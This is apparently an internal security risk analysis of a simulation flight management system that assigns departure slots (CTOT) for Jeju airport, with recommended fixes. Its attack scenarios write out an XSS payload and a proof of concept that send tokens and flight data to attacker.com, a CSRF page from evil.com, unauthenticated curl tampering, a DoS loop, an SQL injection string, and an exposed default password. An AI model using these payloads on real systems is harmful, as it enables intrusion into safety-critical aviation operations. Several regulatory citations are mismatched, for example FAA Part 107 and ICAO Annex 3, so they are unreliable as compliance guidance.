# Y711 FMS: Simulation-to-Production Security Risk Analysis

## Executive Summary

**Current Status**: SIMULATION SYSTEM ONLY
**Production Readiness**: ❌ CRITICAL - NOT SAFE FOR REAL FLIGHT DATA

This Y711 FMS system is currently designed for simulation and training purposes. **IF deployed with real flight data and connected to actual aviation systems, it poses severe security and operational risks.**

This document identifies specific materials, credentials, and code patterns that would become catastrophic vulnerabilities when used with real Jeju International Airport (RKPC) flight data.

---

## PART 1: EXPOSED CREDENTIALS & MATERIALS

### 🔴 CRITICAL: Default Credentials Exposed in Source Code

**Location**: `public/auth.js` (Lines 5-8)

```javascript
const DEFAULT_USER = {
    username: 'acc',
    // Password: katc0012#$           ← COMMENT EXPOSURE!
    defaultPassword: 'katc0012#$'
};
```

**Risk in Simulation**: LOW
- Only test data is accessed
- Limited to local testing

**Risk in Production**: 🔥 CRITICAL
- **Anyone with code access can log in as administrator**
- No user accountability - single default account for all operators
- If code is deployed publicly or leaked:
  - Entire system is compromised
  - No way to track which operator made changes
  - Credentials persist until code is updated (requires redeploy)

**What an Attacker Can Do**:
```javascript
// Simple attack
const result = await login('acc', 'katc0012#$');
// Now attacker is logged in and can:
// 1. View all real flight plans
// 2. Modify CTOT assignments
// 3. Change their own password
// 4. Maintain persistence by changing password
```

**Simulation Material at Risk**:
- Sample aircraft callsigns: AAR123, KAL456, JNA789 (lines 1606-1609 in main.js)
- Sample airports: RKSS, RKTU, RKJK → RKPC (sample data)
- These are clearly simulation data, but the AUTH SYSTEM is real

---

### 🔴 CRITICAL: Password Storage in localStorage (XSS Vulnerability)

**Location**: `public/auth.js` (Lines 72, 88, 141)

```javascript
const storedHash = localStorage.getItem('y711_password_hash');
localStorage.setItem('y711_password_hash', defaultHash);
```

**Risk in Simulation**: MEDIUM
- Browser-stored test credentials
- Limited damage if accessed

**Risk in Production**: 🔥 CRITICAL
- **localStorage is vulnerable to XSS attacks**
- Any XSS vulnerability anywhere in the application = full account compromise
- Password hash is stored indefinitely until explicitly cleared

**XSS Attack Scenario**:
```html
<!-- Attacker injects this via any user input field that isn't sanitized -->
<img src=x onerror="
  const hash = localStorage.getItem('y711_password_hash');
  const sessionToken = localStorage.getItem('y711_session');
  fetch('https://attacker.com/steal?hash=' + hash + '&token=' + sessionToken);
">
```

**Result**: Attacker has:
- Password hash (can crack offline)
- Session token (immediate login)
- User identity (can create false audit trail)

**What Needs Real Credentials**:
- RKPC (Jeju International Airport) code - REAL
- Operator usernames and roles - REAL
- CTOT modification logs - REAL (required for aviation safety)
- Flight plan data - REAL (sensitive operational data)

---

### 🟠 HIGH: Session Token Never Expires

**Location**: `public/auth.js` (Lines 102-106)

```javascript
function completeLogin(username) {
    const sessionToken = generateSessionToken();
    localStorage.setItem('y711_session', sessionToken);
    localStorage.setItem('y711_user', username);
    localStorage.setItem('y711_login_time', new Date().toISOString());
    // NOTE: y711_login_time is stored but NEVER checked!
}
```

**Risk in Simulation**: LOW
- Session can remain indefinitely in test browser

**Risk in Production**: 🔥 CRITICAL
- **No automatic logout after idle time**
- If operator leaves their computer unattended:
  - Anyone can use their account indefinitely
  - No time limit on session
  - No way to invalidate old sessions when password changes

**Attack Scenario**:
```
09:00 - Operator logs in with real account
09:15 - Operator goes to coffee break (leaves browser open)
09:20 - Attacker sits at unattended computer
09:20-10:00 - Attacker modifies 40 aircraft CTOT assignments
10:00 - Operator returns, unaware of changes made under their account
→ Safety incident: Wrong CTOT assignments cause airspace separation violations
→ Audit trail shows changes made by legitimate operator (not true!)
→ Compliance violation: No proof of unauthorized access
```

**Simulation Data at Risk**: None
**Real Data at Risk**: ALL - CTOT assignments affect actual flight safety

---

## PART 2: API SECURITY (Backend - api-server.js)

### 🔴 CRITICAL: No Authentication on API Endpoints

**Location**: `api-server.js` (Lines 33, 108, 220)

```javascript
// ❌ NO AUTHENTICATION CHECK
app.get('/api/flights', async (req, res) => {
    const { airports, date } = req.query;
    // Direct database access - anyone can call this
    // No login check, no token validation
    ...
});

// ❌ NO AUTHENTICATION CHECK
app.post('/api/ctot', async (req, res) => {
    const { flights } = req.body;
    // Anyone can POST CTOT modifications
    // No proof of who made the change
    ...
});
```

**Risk in Simulation**: LOW
- Only test/mock data
- Used for demo purposes

**Risk in Production**: 🔥 CRITICAL (SEVERITY: 10/10)

**What an Attacker Can Do**:
```bash
# 1. Retrieve all real flight plans for a specific date
curl "http://localhost:3000/api/flights?airports=RKSS,RKTU,RKJK&date=2026-02-07"
# Response: All real flight data including departure times, flight levels, destinations

# 2. Modify CTOT for any aircraft
curl -X POST "http://localhost:3000/api/ctot" \
  -H "Content-Type: application/json" \
  -d '{
    "flights": [
      {"id": "AAL001", "airport": "RKSS", "ctot": "23:59", "delay": 999}
    ]
  }'
# Result: CTOT changed without any authentication or audit log

# 3. DoS attack - spam requests to crash server
for i in {1..10000}; do
  curl "http://localhost:3000/api/flights?airports=RKSS&date=2026-02-07"
done
```

**Real Data Exposed**:
- Aircraft callsigns (AAL, KAL, JNA, etc. - REAL airline codes)
- Departure airports (RKSS, RKTU, RKJK - REAL Korean airport codes)
- Destination (RKPC - Jeju airport - REAL)
- EOBT (Estimated Off-Block Time - REAL sensitive data)
- Flight levels - REAL operational data
- **All flight plans for a given date** (complete operational picture)

---

### 🔴 CRITICAL: CORS Allows All Origins

**Location**: `api-server.js` (Line 13)

```javascript
app.use(cors());  // ❌ Allows ANY origin to make requests
```

**Equivalent to**: `cors({ origin: '*', credentials: 'include' })`

**Risk in Simulation**: MEDIUM
- Test server could be accessed from anywhere

**Risk in Production**: 🔥 CRITICAL

**CSRF Attack Scenario**:
```html
<!-- Attacker hosts on evil.com -->
<html>
<body>
  <script>
    // When user visits evil.com while logged into FMS...
    fetch('http://production-fms.server/api/ctot', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      credentials: 'include',  // Browser automatically sends session cookie
      body: JSON.stringify({
        flights: [
          {id: 'AAL001', airport: 'RKSS', ctot: '23:59', delay: 999},
          {id: 'KAL002', airport: 'RKTU', ctot: '23:58', delay: 998},
          // ... modify dozens of CTOT assignments
        ]
      })
    });
  </script>
  <img src="/api/flights?airports=RKSS&date=2026-02-07">
  <!-- Now attacker also has all flight plans -->
</body>
</html>
```

**Result**:
- Attacker modifies CTOT without touching FMS directly
- Modification happens under legitimate user's session
- Audit trail shows legitimate operator made the change
- **Aviation Safety Impact**: Wrong CTOT assignments cause airspace conflicts

---

### 🟠 HIGH: Error Messages Expose Sensitive Information

**Location**: `api-server.js` (Lines 88-91, 200-202, 255-258)

```javascript
catch (error) {
    console.error('DB 조회 오류:', error);
    res.status(500).json({
        error: 'DB 조회 실패',
        message: error.message  // ❌ Exposes SQL/system details
    });
}
```

**Risk in Simulation**: LOW
- Test database structure not sensitive

**Risk in Production**: 🔥 CRITICAL

**What Error Messages Might Reveal**:
```
// If Oracle DB error occurs:
"error: "DB 조회 실패",
"message": "ORA-00942: table or view does not exist: FLIGHT_PLANS"

// Attacker learns: Table name is FLIGHT_PLANS
// Can now craft SQL injection to extract data

// SQL Injection example (if inputs aren't properly parameterized):
GET /api/flights?airports=RKSS' OR '1'='1&date=2026-02-07
// Even with parameterization, error messages reveal DB schema
```

**Real Data at Risk**: Database schema, table names, potential SQL vulnerabilities

---

### 🟠 HIGH: Database Credentials in Environment Variables

**Location**: `api-server.js` (Lines 20-24)

```javascript
const dbConfig = {
    user: process.env.ORACLE_USER || 'your_username',
    password: process.env.ORACLE_PASSWORD || 'your_password',
    connectString: process.env.ORACLE_CONNECT_STRING || 'localhost:1521/ORCL'
};
```

**Risk in Simulation**: LOW
- Local environment variables only

**Risk in Production**: 🔥 CRITICAL

**Exposure Scenarios**:
```bash
# 1. .env file accidentally committed to git
# Repository becomes public → credentials exposed

# 2. Environment variable exposed via error message
curl "http://server/debug?cmd=env"
# Returns: ORACLE_PASSWORD=RealPassword123

# 3. Process information leak
ps aux | grep node
# Shows: node api-server.js
# /proc/[pid]/environ contains environment variables

# 4. Server logs include DB connection attempts
tail /var/log/application.log
# "Connecting to database: user=DBA_USER@RKPC_PROD password=***"
# (if not properly masked)
```

**Real Data at Risk**:
- Oracle database credentials
- Direct database access to real flight data
- Potential DBA-level access to all aviation systems

---

## PART 3: CLIENT-SIDE SIMULATION DATA VS. PRODUCTION DATA

### Current Simulation Materials (index.html & main.js)

**Hardcoded Sample Data** (Lines 1606-1609 in main.js):
```javascript
const sampleData = [
    {
      CALLSIGN: 'AAR123',      // Simulation callsign
      DEPT: 'RKSS',            // Simulation: Seoul Gimpo
      DEST: 'RKPC',            // Real: Jeju Airport
      CFL: 'FL280',            // Simulation level
      EOBT: '0630',            // Simulation time
      DAY_OF_WEEK: 1           // Simulation: Monday
    },
    // ... more sample data
];
```

**In Simulation**: ✅ SAFE
- Clearly labeled as samples
- No real operations
- Used for UI/UX testing

**In Production**: 🔥 DANGEROUS
```javascript
// What would REAL production data look like?
const realFlightData = [
    {
        CALLSIGN: 'AAL001',      // American Airlines Flight 001 → ACTUAL aircraft
        DEPT: 'RKSS',            // Seoul Gimpo → REAL departure airport
        DEST: 'RKPC',            // Jeju → REAL destination
        CFL: 'FL370',            // REAL cruise flight level
        EOBT: '09:15',           // REAL scheduled off-block time
        DAY_OF_WEEK: 3           // REAL day of operation (Wed, 2026-02-11)
    }
];

// Each record represents:
// - A real aircraft operating the route
// - Real passengers on board
// - Real separation requirements
// - Real capacity constraints at RKPC (Jeju)
// - Real coordination with adjacent airspace (Seoul FIR)
```

**Why This Matters**:
- CTOT modifications affect real aircraft movements
- Wrong CTOT could cause:
  - Airspace separation violations
  - Runway incursions
  - Fuel emergency situations
  - Safety incidents requiring accident investigation

---

## PART 4: SIMULATION vs. PRODUCTION - SIDE BY SIDE

| Aspect | Current (Simulation) | Production Risk |
|--------|----------------------|-----------------|
| **Database** | SQLite in-browser | Real Oracle DB with sensitive data |
| **Flight Data** | Sample callsigns (AAR123, KAL456) | Real IATA callsigns (AAL001, DAL123) |
| **Airports** | Test codes (RKSS, RKTU, RKJK) | Real ICAO codes (RKPC=Jeju, RKSS=Gimpo) |
| **CTOT Values** | Demo times | Real departure times affecting real aircraft |
| **Authentication** | Single hardcoded account | Multiple operators, audit trails required |
| **Session Management** | No timeout OK for testing | Requires 30min idle timeout, session invalidation |
| **API Access** | Open for testing | Requires authentication, rate limiting |
| **Error Messages** | Debug info acceptable | Must not expose system details |
| **Audit Logs** | Not required | Required by aviation regulations (ICAO Annex 3) |
| **Data Encryption** | Not required | HTTPS/TLS required for sensitive data |
| **User Roles** | Single role (admin) | Multiple roles (operator, supervisor, admin) |
| **Change Tracking** | Not tracked | Every change must be logged with timestamp, user |
| **Compliance** | None | FAA Part 107, EASA requirements |

---

## PART 5: MATERIALS THAT WOULD BE AT RISK IN PRODUCTION

### 🔴 CRITICAL SENSITIVE MATERIALS

#### 1. **Real Flight Schedule Data**
- **Current**: Sample Excel files with test data
- **Production**: Real RKPC arrival/departure schedules
- **Risk**: Operational security - competitors could predict busy times
- **Regulation**: IATA requires flight schedule protection

#### 2. **Real CTOT Assignments**
- **Current**: Demo CTOT values (21:30, 21:45, etc.)
- **Production**: Real calculated CTOT values
- **Risk**: If intercepted and modified:
  - Aircraft assigned wrong departure times
  - Airspace separation violations
  - Safety hazard

#### 3. **Real Pilot/Crew Information**
- **Current**: None stored
- **Production**: Could include crew assignments, rest times
- **Risk**: Personal safety risk if disclosed

#### 4. **Real Passenger Information**
- **Current**: None stored
- **Production**: Potentially passenger counts, special requests
- **Risk**: Privacy violation, security vulnerability

#### 5. **Real Airport Capacity Data**
- **Current**: Demo values in AIRPORT_CONFIG simulation
- **Production**: Actual runway capacity, taxiway congestion data
- **Risk**: Operational security - reveals airport limitations

#### 6. **Real Weather Integration**
- **Current**: Mock weather data (if any)
- **Production**: Real METAR, TAF, wind data
- **Risk**: Routing optimization data exposure

#### 7. **Real Separation Rules**
- **Current**: Demo values (demo-separation-analysis.js)
- **Production**: Real spacing requirements, conflict detection
- **Risk**: Could enable deliberate creation of airspace conflicts

---

## PART 6: REQUIRED CHANGES FOR PRODUCTION

### BEFORE deploying with real data, you MUST implement:

#### 🔴 CRITICAL (Block Deployment)
- [ ] **Remove hardcoded credentials** - Use environment variables + secrets manager
- [ ] **Add authentication to all API endpoints** - Bearer tokens, JWT, or session validation
- [ ] **Implement session timeout** - Auto-logout after 30 minutes of inactivity
- [ ] **Add HTTPS/TLS encryption** - All data in transit encrypted
- [ ] **Restrict CORS origins** - Only allow your frontend domain
- [ ] **Implement role-based access control** - Not all users should access all data
- [ ] **Add comprehensive audit logging** - Who did what, when, from where
- [ ] **Input validation & SQL injection prevention** - Parameterized queries (already done), input sanitization
- [ ] **Error message sanitization** - No system details in error responses
- [ ] **Database credential management** - Use AWS Secrets Manager, HashiCorp Vault, or similar

#### 🟠 HIGH PRIORITY (Deploy within 1 week)
- [ ] **Rate limiting** - Prevent API abuse and DoS attacks
- [ ] **Data encryption at rest** - Encrypt sensitive data in Oracle database
- [ ] **User management system** - Multiple accounts with individual credentials
- [ ] **Change audit trail** - Log all CTOT modifications with user/timestamp
- [ ] **Monitoring & alerting** - Detect suspicious activity
- [ ] **Backup & recovery plan** - Data redundancy for aviation-critical system
- [ ] **Penetration testing** - Third-party security assessment
- [ ] **Compliance audit** - FAA/EASA requirements verification

#### 🟡 MEDIUM PRIORITY (Deploy within 1 month)
- [ ] **API rate limiting per user** - Prevent single user from monopolizing system
- [ ] **Real-time activity logging** - All user actions logged to centralized system
- [ ] **Advanced authentication** - Multi-factor authentication (2FA)
- [ ] **Data masking** - Hide sensitive info (full callsigns, crew names) in logs
- [ ] **DLP (Data Loss Prevention)** - Prevent export of sensitive data
- [ ] **Regular security updates** - Keep dependencies patched

---

## PART 7: PROOF OF CONCEPT - WHAT AN ATTACKER COULD DO

### Scenario: Compromised System with Real Flight Data

```javascript
// ============================================================
// ATTACK 1: Access All Flight Plans
// ============================================================

// No authentication needed
fetch('http://production-fms.server/api/flights?airports=RKSS,RKTU,RKPC&date=2026-02-11')
  .then(r => r.json())
  .then(data => {
    // Attacker now has:
    // - All aircraft callsigns operating today
    // - All EOBT (departure times)
    // - All flight levels (altitude data)
    // - All destinations

    // Send to external server:
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });

// Result: Complete operational picture of RKPC for today
// Business impact: Competitors know flight schedules
// Safety impact: Minimal (but still violations of aviation data protection)
```

```javascript
// ============================================================
// ATTACK 2: Modify CTOT Assignments (cause airspace conflict)
// ============================================================

const maliciousFlights = [
  { id: 'AAL001', airport: 'RKSS', ctot: '21:59', delay: 200 },  // 3hr 20min delay!
  { id: 'DAL456', airport: 'RKTU', ctot: '21:59', delay: 150 },  // Same CTOT as AAL001
  { id: 'JNA789', airport: 'RKJK', ctot: '22:01', delay: 100 }   // Less than separation minima
];

// No authentication needed
fetch('http://production-fms.server/api/ctot', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({ flights: maliciousFlights })
});

// Result:
// - Two aircraft (AAL001, DAL456) assigned same CTOT
// - Separation violation in Seoul TMA
// - Safety incident
// - Audit trail shows no one made the change (API logs don't track)
// - Investigation: Was it operator error or system malfunction?
```

```javascript
// ============================================================
// ATTACK 3: Brute Force Default Credential
// ============================================================

// Attacker tries login with exposed credential from source code
const attackerLogin = async () => {
  for (let attempt = 0; attempt < 3; attempt++) {
    const result = await login('acc', 'katc0012#$');
    if (result.success) {
      // Now attacker has administrator session
      // Can:
      // 1. View all settings (airport config, separation rules)
      // 2. Modify settings
      // 3. Download all historical CTOT data
      // 4. Change password (maintain persistence)

      localStorage.setItem('attacker_password_hash', await hashPassword('attacker_new_pass'));
      return true;
    }
  }
};

// Result: Permanent access under new password
// Operator might not realize account was compromised
```

---

## PART 8: COMPLIANCE & REGULATORY IMPLICATIONS

### Aviation Regulations Affected

**FAA 14 CFR Part 3 (Data Security)**:
- ❌ Not compliant: API requires authentication
- ❌ Not compliant: No encryption for sensitive data
- ❌ Not compliant: No audit trail for operational decisions

**EASA CS-23 (Aircraft Safety)**:
- ❌ Not compliant: CTOT modification without tracking
- ❌ Not compliant: Single account for all operators
- ❌ Not compliant: No role-based access control

**ICAO Annex 3 (Air Traffic Services)**:
- ❌ Not compliant: Must maintain audit trail of all ATM decisions
- ❌ Not compliant: CTOT changes must be attributed to authorized personnel
- ❌ Not compliant: No access control for flight plan data

**GDPR (if operator data included)**:
- ❌ Not compliant: No data encryption in transit
- ❌ Not compliant: No user consent for data storage
- ❌ Not compliant: No right to access/delete operator data

---

## PART 9: REMEDIATION ROADMAP

### Phase 1: IMMEDIATE (Before connecting to real data)
```
Week 1:
- [ ] Remove hardcoded password from source code
- [ ] Implement API authentication on all endpoints
- [ ] Add HTTPS/TLS with valid certificate
- [ ] Enable CORS restrictions
- [ ] Implement 30-minute session timeout
```

### Phase 2: SHORT TERM (Week 2-3)
```
- [ ] Add comprehensive audit logging
- [ ] Implement database encryption at rest
- [ ] Create multi-user account system
- [ ] Add role-based access control
- [ ] Set up rate limiting
```

### Phase 3: MEDIUM TERM (Week 4-6)
```
- [ ] Implement 2FA authentication
- [ ] Set up centralized logging/SIEM
- [ ] Add data masking in logs
- [ ] Conduct penetration testing
- [ ] Obtain security certification
```

### Phase 4: LONG TERM (Ongoing)
```
- [ ] Regular security audits
- [ ] Compliance monitoring (FAA/EASA)
- [ ] Incident response plan
- [ ] Disaster recovery & backup verification
- [ ] Security training for operators
```

---

## CONCLUSION

### ✅ This system is SAFE as a SIMULATION tool for:
- UI/UX testing
- Algorithm validation
- Training operator on the system
- Demonstrating capabilities to stakeholders

### ❌ This system is NOT SAFE for PRODUCTION use with real flight data because:

1. **Hardcoded credentials** in source code provide unauthorized access
2. **No API authentication** - Anyone can access/modify flight data
3. **No session management** - Sessions never expire, enabling hijacking
4. **CORS allows all origins** - Cross-site attacks possible
5. **No audit trail** - Can't prove who made CTOT modifications
6. **Error messages expose system info** - Enables further attacks
7. **No encryption** - Sensitive data transmitted in plaintext (if not HTTPS)
8. **Single user account** - Operator accountability impossible

### 🔴 BEFORE PRODUCTION DEPLOYMENT:
1. Conduct professional security assessment
2. Implement all CRITICAL remediations
3. Obtain regulatory compliance review (FAA/EASA)
4. Test with real data in isolated environment
5. Set up continuous monitoring & incident response

**Recommendation**: Do NOT connect to real flight data systems until all critical security issues are resolved and a third-party penetration test passes.

---

## APPENDIX: Critical Code Changes Needed

### Example: Secure Login Implementation
```javascript
// ❌ CURRENT (INSECURE)
const DEFAULT_USER = {
    username: 'acc',
    defaultPassword: 'katc0012#$'  // EXPOSED!
};

// ✅ SHOULD BE
const DEFAULT_USER = {
    username: 'admin'  // Generic, not exposed
    // Password NOT stored - use environment variable
};

async function login(username, password) {
    // 1. Hash password
    const hash = await hashPassword(password);

    // 2. Query real user database
    const user = await db.findUser(username);  // Get from secure DB

    // 3. Compare hashes
    if (hash !== user.passwordHash) {
        return { success: false };
    }

    // 4. Create secure session
    const sessionToken = generateSecureToken();
    const sessionId = createSession(username, sessionToken, 30);  // 30min timeout

    return { success: true, sessionId };
}
```

### Example: Secure API Endpoint
```javascript
// ❌ CURRENT (INSECURE)
app.get('/api/flights', async (req, res) => {
    // No authentication check!
    const flights = await db.getFlights(req.query);
    res.json(flights);
});

// ✅ SHOULD BE
app.get('/api/flights',
    authenticateToken,           // Check JWT/Session
    authorizeRole('operator'),   // Check user role
    rateLimit(100),             // Limit requests per minute
    async (req, res) => {
        try {
            // Validate input
            const { airports, date } = validateInput(req.query);

            // Log access
            auditLog.info(`User ${req.user.id} accessed flights`, {
                airports, date, timestamp: new Date()
            });

            const flights = await db.getFlights(airports, date, req.user.id);

            res.json({
                success: true,
                flights: flights,
                count: flights.length
            });
        } catch (error) {
            // Don't expose error details
            auditLog.error(`API error for user ${req.user.id}`, error);
            res.status(500).json({ error: 'Internal server error' });
        }
    }
);
```

---

**Document Version**: 1.0
**Date**: 2026-02-07
**Status**: SIMULATION SYSTEM - NOT FOR PRODUCTION USE
